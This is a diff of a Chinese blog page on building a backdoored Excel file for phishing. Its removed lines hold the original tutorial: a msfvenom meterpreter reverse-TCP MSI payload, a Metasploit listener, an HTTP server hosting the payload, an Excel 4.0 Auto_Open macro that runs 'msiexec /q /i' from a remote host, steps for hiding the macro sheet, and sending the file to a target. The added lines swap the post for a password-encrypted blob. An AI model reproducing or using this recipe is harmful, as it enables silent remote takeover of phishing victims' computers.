@@ -16,29 +16,18 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="声明1注：本文所介绍所有工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！  前言之前通过学习研究，制作了world宏病毒文件以此来进行钓鱼上线，但通过制作后门文件的方式还有很多，这篇文章将通过excel方式进行宏病毒文件制作，当前和之前制作world文件一样，并不具备免杀效果，但是也是使用得远程加载，在一定程度上能起到免杀。 1、首先生成E">
+    <meta name="description" content="有东西被加密了, 请输入密码查看.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="制作excel后门文件">
 <meta property="og:url" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/index.html">
 <meta property="og:site_name" content="nf592">
-<meta property="og:description" content="声明1注：本文所介绍所有工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！  前言之前通过学习研究，制作了world宏病毒文件以此来进行钓鱼上线，但通过制作后门文件的方式还有很多，这篇文章将通过excel方式进行宏病毒文件制作，当前和之前制作world文件一样，并不具备免杀效果，但是也是使用得远程加载，在一定程度上能起到免杀。 1、首先生成E">
+<meta property="og:description" content="有东西被加密了, 请输入密码查看.">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/1.png">
-<meta property="og:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/2.png">
-<meta property="og:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/5.png">
-<meta property="og:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/3.png">
-<meta property="og:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/4.png">
-<meta property="og:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/6.png">
-<meta property="og:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/7.png">
-<meta property="og:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/8.png">
-<meta property="og:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/9.png">
-<meta property="og:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/10.png">
 <meta property="article:published_time" content="2022-11-09T06:07:36.000Z">
-<meta property="article:modified_time" content="2022-11-17T12:26:11.792Z">
+<meta property="article:modified_time" content="2022-12-20T01:26:16.532Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="apt&#x2F;社工">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/1.png">
   
   
   
@@ -230,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          795 字
+          11k 字
         
       </span>
     
@@ -241,7 +230,7 @@
         
         
         
-          7 分钟
+          91 分钟
         
       </span>
     
@@ -282,59 +271,22 @@
             <h1 style="display: none">制作excel后门文件</h1>
             
             
-              <div class="markdown-body">
-                
-                <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">注：本文所介绍所有工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！<br></code></pre></td></tr></table></figure>
+              
+              <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="9a2e75524513cdb838a1fc7efa9e7237d09d52dd26e3727317a7571ae11b4449">18cbfeb9d2ccb2d0f0d0159ccbc79c37a55c068a517e5d3eab5a405d1b5df29392f76943596572b1b298c065608a0a9f9245ada96ca56406cfa20a127c9cdfc61238a7f9888324497c4c2034bb775dca8acf93b3667004a33bb40a9d4d1248119734f2a57eb713e04ba3b63aeec959cc2289bc2ac48205f4bab03b4e0fc5fb631b76f82f11685f26cd4ac6662113eb7399f413deef4b88093d4fc24a7339d8bb12c03acf6fe94e7a969a2d16fca6a945a92b35a389f9ad559a53782d16859da84848d87555a27d1b161c130c0465c318c5c27395b7340219e2d0059fc6b3149364698d80806356f5fab59765f65f832c976b5994986c3bc2d3149a21c00f9d6a44cd70c0578bc34cbe5db70b0e12b085c023b6633e41fe16a9248d8ef0e7582bf3f622cda1b5888562e536322ab0ab90fb9f820b4ad9ace7e27ce3c39d2ba07ccbee24ff7d5916a6257a11b869089cb858b03609376e271c582caf10d7d4826bded4c28fa624e5ad43212207bc447ce2de87dd2bbf24c6b07d91b62bf4bc779f5533ffacecb16fd6885181f846b4b3b03a02906e9df9b62c2b7703cf3ab02aeccd5f3f091beab19eef470b6a5e7536d6f295d19dc08e80c6fcdffa91fa1519f268a1a9d5e59b9f6ed7297e2ce2d0438d1aababf55ec6d2ad019df80c0905c9045e2c4c5d5eeee5a558838a796ca6bb58507acd83158f7dee260a7378ba0904eef9de82bed544034e74a656b19254375378694c7b99c1f940b6ce2e09d6f9441b51496f0db0b2b5a02154939d71c50694f9455af09b9eacdb9cebc0bf2b191e2b6d47257edbc59456fba8a27dcd05b6c3075560ed420428ce55ac245d057d0553a0dae0309a759740039ca684be2f73e4a18b0be68d387bc94ebf8b0e11e61af9dadc79cce61ba4a229f2330337ec545b8a1643a0001001e52f58b86a3ae0168581f686ad439f9cc6265ce249149688b38fa47883e7e8ca7ae3fe86c66450d90330df07796c200478483990d3597500d6be029d4060872e36030ed6563472adac840eb8245a4274b27409ea9f34d5ceeaeb58ad1bff3db9c16c62e80f787008ce0421f2162b9c365c576232311659b5bec548f8d70f20a502711a78d6507728bba2dfc240c3f5e819296f5c521e37315d65560d77753b362b33a8766446fad4c1aa60d9cb7d6d90156bfe8e30f9827c1ecc2832043874c0fce796cdbf52a9c6c15ede923a805480fedfecaf4e798e05aa375886a02c9e256d40dde3228c25b7af47e23cd48978238a695f4f680d3402a6858e65dcb21d22245c31d715b08d240580ff8342906814cb10032630e71a74ae0ba879dd9c1ac87d479c1665a8d99724e6436a12c0c1e786cefed229b7b5bc4852651fae206d6b5965cede6a8ab550a772201d2cb5b09015f02b5ef39c87af07602ff0ff452d0275b06794b00a4112baa12051d0f70e742df09fad5074137e4eaf6e3023ec3ff4d26477daedc5f2cbfbe6e2637761d3630de6be4d392032a23d896f346a08031aa056bb57b700895c488be24ec4a32230f6fa458386ec89a0473ce6306cbd0c9f543178d1cf106f73e5c021ed5edc94eb8fbd4f1b5353fea74c184befb9cf85ab262d3c501a8e974666f9240a4d9f82fb85f9ad1fb646736c622ef47026d44e18b4324f0da7f8ad7fb42f19e0242afdf3c8592f6245d1ee2887549aea48e7c592ad1a0933523b1661db682094b453b3d1a7b27bb61fadfd44652239ddfc2fe52b027ccec931e107c2c23aca207b6875b6d578ffde2cb1a026512e4867755dba044285fda3444362fbb40047dee559f5aaf339de429029888bebff611fb5d65d1a792a9a63b5a9e754126e92689870b9ae12f510ee45391b7e50970c9e636a68d1fb01b62c0020a29c12ea58dc8c027aebcc7c1f43ba28ba3827c5e89091ac4bf31e4df4a0583d5c3618e7d3a0e40fa21198143f06953f2b39d30e115494c8e7f06634da2658b86a8739ad8a7d3d00783034864d70c6dde1c770f071e22b108c879ace25119a0acc52699ce7e9fed3d9423217d78199fab7fc18447efb8f634a797da6ba818276ab382c2a20081797ef9b758344f4a6b2fd29a56b8cdc4a94cab033e8fdb70f41805debc9ceb89f11716cec13199c716f770ff749b13eef30ae4fac075699b3be34d88bd6ff686bb974e0a34b8436af2c0ab02ed9589dcce878575574fd09f64f0eb6ff385798f04c59e3df519cfc2585c316cc5d1a5364065731d14d5a8f61ffc64d773b90d6b86b2eef21ecbe4dd37ed52501f78881862a6dd5e2515211bbee180ce0acc9f017be4d73129442765eea54a7b0fb79bc25c8732ef88cf7694df59ab201dd32d80f2c7644fd6920923ca6d1c1a83be4e323c02bc6bc180676c05ca422249979c7209c7dae50d3677992bded191068df1e4faba5af292c17bf0858df8acf820a3191fe987778ba2d1d0966fcc9c61c2ab16166f3c9f27720fc7846fdc0ea5b416881e9817ef95c138eb9ca6d4a1ad5814a48b110c07f345f5736dc451d94d0e3453a34d086d4d3f5505bb67966de2f869180d32fc519377612bd2d5e54e86800ecee5292d1ab23e294c072179773f650dad9c71e4d640281206fb3ffb0148d494c42e3276f767eefeff9001dd7a3902711515547b89e57005fdb865d18e849d4e9af0b8698284e020628c897778824237fe436c10f97abdb78e1545ac0e17e7975b4e51febfcc4619e81ae01f107b0a3ffdc5746ef520e9d237012e7d76e3fd5f9f2677a313b45c4f95f7078258a6d65b30239e4f70ec26da7e4e88a22d6dd07d22c9a89445f3d2267ad9adf4ed292cddf37d1c70ccc76179314f08f5ab3fc886e2b3f1a7efe1cc1b5863a94583b1765ff1e9b6f4615cc9ef6ab8e767141212341ddf2938957705ff214b8257e28fb33763d8484a778cf282a312a338e463058eaa1a5d743ff36dcb5120268ada746321250635c13087d6217e5a1a21a69caee1f63e0fc81fe014bb7d54dcbc62d096c8c9388b10f258683d3533cc82b96728ed075f073bd7be84d0affe276c89209996119134b4650af5e5cefb93672d08536775fa8339d5187b11abaeac98fcc96fb755a0415c93c2b9784ed6e47ae1ddc12cdcf13e7a47e449930f4af3acdb03b7183c403f2df9864a000c9285b09748e298b9a65e7ccc0229375ed027a5aebda616b3381521893c6afc055bbeece8fff193ac847c920e9961e6b4d9b2acddba435aa70b7eff695094b210b9eff70ac3503652534308aecffac524098a3737c9d7acb347f8c59ea2c3eecafcb55179be171b92c5b4e6db5194b2347be094a6693659cbb7db9d10b0dedae81192a081e8d64512b50a629ebcd475f61fb6a4c22c13bf93f0ccb5e66223ca832e32d4be69168ae9ec8a0572431174c9c9e52183c3b749a8d23b9b304724ad6fd02ed77de4aec6e016f6debb5a105383e41782f57ded8ba164ff59d23628c757c9d8400a458bcb329c98cf8c42fb8f7456bb8a72814d792af0a5c3fcf1e58aad21b3c46d57d602475829c18b5e927efe3118f63b8b23521a3bdf97c6161ff6747460ad77fd83a13258d29cefb5c62d76f3a0c9018312321ba78fcdbd55430269cd5e68fa661dc68df1db841cadc79009ee28b2397239757be37bd43ec90f9c274cba4671949d60c42937fee22d26f82e0d3abdde88fe09015f96b9ca59fbef453e5a00b498592214d26701a869b64a5bf7a8e02bf46c22ec44585bf447f840d785dc3f7f29d81fe4613819aad9908748d1fadd8bed27aa62d657b286eed9c9d725f96df146a8d800fea43a33ff29077833b6305ccdb3d76c6152c8e307ede0380149bda519ebe69d83cea061a5186753875ab3a6dab09aecfc37ae7e49daa2f04b496e02f13d8be56afecf6b7af1a10a40b50934643b2da8d4c0ee38ab8fe37760c0f652c1cffaf704464bdc160c8b203bcc5c510e1893dae38ef713265baba4ff491d7d3f0f25ca963f4b5f74c3c9b8b58c7f454380d760cc9c8622d734ea1e68e2645763ca3ce2d40ec8ed49cd33e3f6e85b880e96bf2630537a758d187bc4bbb04b474d0251f9e18dc7d79eab00839dc6f9881bc4b73821ea2973e626a8d0ee5b1113633baf4278d1259582d00891a2b98794c53d180cb30fccaaee599a689bd5f81368c80390729e1b0c0b33818b866e595b9667e34a9ac33f864c9b14179df5dde709c4f2da3cdda3af08821c8243f960494c40ac889bf8b57af2df4f9456594bb4626f674ece9ec0412b42586b0e3d9e1a90680d85f1ef8e7c150a594fe7d17ceaf9ceb694a7f1ab50ddbc63a21f7ad1e1da90a823762eb8fbe5c93734ee033ebd6a9ebbca567d0a9157b260b97493a5b4132b8bb9c53e41b69ef6743d73bb9a0fe78bde0441817d5fa33773cab8238e401411fccbc5b007c82020adceb4f1c41c6afc415374ad907c72a535bb7a16c5b237340910c4627705d4b090230398c059be1246707c4ab2b5bb8306c032364e01e6c9d1801379580218c4cb511c03559f1985d8928e2b17ededd0707d279dc64f6716e42bedc77e9ce5ed35a54d98b43a729d4bf31acaae6620084f6778a4dc21b4fc7e6389dd45bce784b3f9e85d7ae6690e8a17186fd250b00b95b65c880d8b0a9b83b685e4c605f768151615b71fa8c76059d08e6ec9e9071de9b0c3dd6422374f75737d6ceb3039980062a9af068c8c8750a5d91f0f0496bcd19326e66421d355b831d0b5b5cbb4fbdb5794594e3140fc5c1d696aedb1baa8cadb35aa02e510c85b870a74ec36b54d40cc20afc0e290ae2c1a759182724a072ed62ddbc1adcaf55bb95239474cd8beb7a43969969ee603e3c1d3144f78d22f1ca0ee6e2f6778cf364a55358d3e65aae9a5074829bbb2fbdc8e7148868e09c8689c39093a28c554f9d0907dd48a09290b3ea60f113d397fab80c522a52cce3b85d8bb96595e82afe1537a96362630b53f62f50b012fb6da9d6dedb04e0a3236d2e2f9d2bb69d63db5f6b8520225729e82d6846b4a7aa9ee7b75487dae7716ff05e206f23cb456595bc16eafe718434d9b03be09eb05ac7793019d5cf877108545f1dc68825d8d9453cbe1444136a8141e1d4526d25b8aab1d753fce655cd10a1909f7c26b3af63e18f4221f666e3531a99990119cbcd0c55e383b30814322e9c95bd1140189d4370f29ec354e19bbcd1dfa7a52f5229efb8a002b0276ad392b55285bda79a1b7b13c09e91fd9b4c71032f6048fbb5eef2495778df6d054b74256b5c4775efdb436953abdd7ccdc03d036012b31345e645120e24bbc92e3272812328d61073795800cc87491efa99a5c5efe3838236bf916f505c235568085f2cf8be901628050ae4e8eb5c7e01a6d1c0695da24b19f7c9c6ca37ad9e6d2ccc99a4a8576b8e80265a407064f802e17900ba54cb621e5222398b9b732b7ac1083e8e314d4e884000d70eb40cab323a88b8ec414e07b8517be610291b6fb014ca2c75464d24412b17b1ce2283873ca41cd4442a9fb994ac15d0df4649043f2bca0806998ee004d0e66137a39a05d548d7af4b03187fa4ca93ef90f63a27b44762e21441d51640fb8380e2cf0739677187617743811cf21f88acd759fd0bce7edc276e9158cd90b793427a34675a541a9a217f47a17c2cb65c5fe4a11c96e27d8dee16382ac72b69d9170f28ef609028eede7925bc2c979070da6c959bca6c4e22e8f1347a3a1a87debb440e0d19d50a62d6f7b7588c870c71443d285205e542f6a25f606eddebdb29a69a63a4c7affb4de6c6549f5996ab5567909db4f4709060ca4f0da5ebca1021b89977fec1cbced9a4b3bc0b0b1373fbdde199ba3dd8d521f206ed46023e0862ae787744387750929b1b04ba033a82d2deb499643b6905442112277371d3bcbe817511709e9ae6bc778b0bd9b6de0cf58bc6c49fa298b5d96894246d2b98bc305da5c178c1f17b5efed7fb381cb27d58dcdd1f4ef0b6a2b9922f271f7786f9b54811637c564951e1859fc12d2e9d48136d25984e6d606c8e2f4a5e2ed647a81c050e57989b04fa6c84cac0291eca1af51d533bd6cdcd76ad1bbc517208153c8fc00167c2caac9027f8148fd1b2d8833911d4b856f606fb9ce0cebf4527ec48a6174d12774b7ca060acf58cee9e437b3f8e34ec557fb76991f6013f187d356c405caf82ae17a370aa0bc4186a21fa02b07e1baf6cea8e9ca0deca8c5a6b49dbb73df82829c15c9f6f5751f1ac63e16030104cfaa014f71a5a176ad2b7ea35eb90ce862044cc967a07623e40eb18f7fe1d08c62e851c0a2e5e596657fb7f0994e4b2e5601616573de0db8f9a4e85e53f23ff8e8db7d40daf3b6fb687292aaa58bc2e15d3a74e7ecb0484ae95f00988cc93ecd6db797ef525f69c8856a6d6b0e63fb864c0d5b2004c0930c8f9f0401861a891d786f8e6f7413b1132d63bf8b966c376bcaeee8012497cc5dde83e301fa7f51d3d91e927619c8ddbf21d115eec8da7208b758445cad788893920a686f6473410ba72596e93bb2355077851934c8fb49cba932907e80526eff9193eee371ae11d04532e92b4c61318899057ec78b4fbe5ed212c3d278e75fd2c569ee9f3c7469b4fb99d4079664011eb1b27fe454f12bd5761b2ada240a0c07dc31638cb772be51b2c4e572555702ab1b752b9921dc15f2079d69983d77376ee568ac4ca3b7f7702e9a035ab55d235f3ecd02674af1ebd298bccb04807bd4384186bcbe82feff23dbb140d46bbe29555afa30f1188bc62c05edc5d04cea28ddb34a2c07b1128caacbe4164a4aedddc7c9b5b233f88111d98a4b49b009d1d99ab640d6f92664be0015aa20640b743b253c72c67a843a0a695414ad3c1d519a766347298374bc5333773daa2fc02d23ade9c2efe6a032c361b73db36da5785feb50c575196afc44cf262fe613de040cc3e0a7ce1decd4dbbd33d52be42fdb3a56e6f13444afa1d788a52da6cff841224697314cf17ebb8cb624229339ed90de4051077c0e01f49e17c89a5d919be526a0a1ce48c6f3d801735f3d6aa97639b085cb980b58cfb265a5874eaed05ba96027bbc121ff56fea73534d01fe62f01f79fb6e0195e9b1c8993fa5636d1f853ac4b6c09d43c86d687269ca7607de0446529d2629341947e5e7fbf401ef3995c456d1fbe756e3218a99a651c68d113c57a13f94bdd535e0e87d0795b64e3cc7d09672624cbd87481dca3a27f1dfb90d538f900a65de7b532cba0ce4b1016825b9421a9d047e1300c59325975b8d3d030b99e52c539f4cc2dc9f89a7d576972fb70c5095279c363de72c0c255101dbe41d332b865b062289d776d022ed575a0d5be927fdd5467ffa42a569f1ee70660fbe62673bf58e4e7780b9acfc76177d6492369b33ad75634048e4499e6a133278167af06a78af89c71492f806975ddd23d7ce1085c735f82f6da66430497b7a76e02394a0bc9f8820f5dd69286170580d7d606581e757ee3591346b031d60a659e932328bad45a875c3513d074f9fa9402de4c9328b67f59915c5275fa3177c9b9c6e43557319dd090c07cba4b2441975ca685c2ab57f346ebf66fffcdcc87e71dec2ea4221786fa963c2693cd7f3746d23683a0fe535ea389b0881bfeaf11888639207c640ef008121878bf318fc8d516302507659866872</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+              
 
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前通过学习研究，制作了world宏病毒文件以此来进行钓鱼上线，但通过制作后门文件的方式还有很多，这篇文章将通过excel方式进行宏病毒文件制作，当前和之前制作world文件一样，并不具备免杀效果，但是也是使用得远程加载，在一定程度上能起到免杀。</p>
-<h2 id="1、首先生成Excel4-0宏后门"><a href="#1、首先生成Excel4-0宏后门" class="headerlink" title="1、首先生成Excel4.0宏后门"></a>1、首先生成Excel4.0宏后门</h2><p>这里我通过kali中的msf进行生成</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=监听IP <span class="hljs-attribute">lport</span>=监听端口 -f msi -o shell.msi<br></code></pre></td></tr></table></figure>
-
-<img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/1.png" srcset="/img/loading.gif" lazyload class="">
-
-<h2 id="2、MSF监听会话"><a href="#2、MSF监听会话" class="headerlink" title="2、MSF监听会话"></a>2、MSF监听会话</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost</span>  监听<span class="hljs-comment">IP</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport</span>  监听端口<br>run <span class="hljs-comment">-j</span><br></code></pre></td></tr></table></figure>
-
-<img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/2.png" srcset="/img/loading.gif" lazyload class="">
-
-<h2 id="3、开启一个http服务"><a href="#3、开启一个http服务" class="headerlink" title="3、开启一个http服务"></a>3、开启一个http服务</h2><p>在目标用户打开excell宏文件时，自动从该服务器下载</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m http.server <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
-
-<img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/5.png" srcset="/img/loading.gif" lazyload class="">
-
-<h2 id="3、新建excel文件"><a href="#3、新建excel文件" class="headerlink" title="3、新建excel文件"></a>3、新建excel文件</h2><p>在新建的excel文件中，右击sheet1工作表，选择插入</p>
-<img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/3.png" srcset="/img/loading.gif" lazyload class="">
-
-
-
-<p>选择Excel4.0宏表，确定</p>
-<img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/4.png" srcset="/img/loading.gif" lazyload class="">
-
-
-
-<p>在宏1标签页中：</p>
-<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs excel">在左上角第一个格子,输入以下内容，调用远程服务器上的shell.msi文件<br>=EXEC(<span class="hljs-string">&quot;msiexec /q /i http://IP/shell.msi&quot;</span>)<br>第二个格子输入以下内容，标识Excel <span class="hljs-number">4.0</span>宏结束<br>=HALT()<br>将左上角的<span class="hljs-symbol">A1</span>模式修改为：Auto_Open，并Enter回车，自动运行宏。<br></code></pre></td></tr></table></figure>
-
-<img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/6.png" srcset="/img/loading.gif" lazyload class="">
-
-
-
-<p>为了在对方打开文件时，显示宏1工资表，这里右击将其隐藏即可</p>
-<img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/7.png" srcset="/img/loading.gif" lazyload class="">
-
-
-
-<p>另存为.xlsm后缀文件</p>
-<img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/8.png" srcset="/img/loading.gif" lazyload class="">
-
-<h2 id="4、目标上线"><a href="#4、目标上线" class="headerlink" title="4、目标上线"></a>4、目标上线</h2><p>再将此文件发送给对方后，只需要点击启用宏，宏会自动下载远程恶意MSI文件并运行，msf就能看到会话</p>
-<img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/9.png" srcset="/img/loading.gif" lazyload class="">
-
-
-
-<p>会话记录</p>
-<img src="/2022/11/09/%E5%88%B6%E4%BD%9Cexcel%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6/10.png" srcset="/img/loading.gif" lazyload class="">
-                
-              </div>
+              
             
             <hr/>
             <div>
@@ -565,6 +517,23 @@
   
 
 
+
+
+  
+  <script defer>
+    if (document.getElementById('hbePass')) {
+      Fluid.utils.waitElementLoaded('hbe-prefix', function() {
+        var hbePrefix = document.querySelector('hbe-prefix');
+        hbePrefix.parentElement.classList.add('markdown-body');
+        Fluid.utils.retry(function() {
+          if (Fluid.boot && Fluid.boot.refresh) {
+            Fluid.boot.refresh();
+            return true;
+          }
+        }, 100, 10);
+      })
+    }
+  </script>
 
 
   
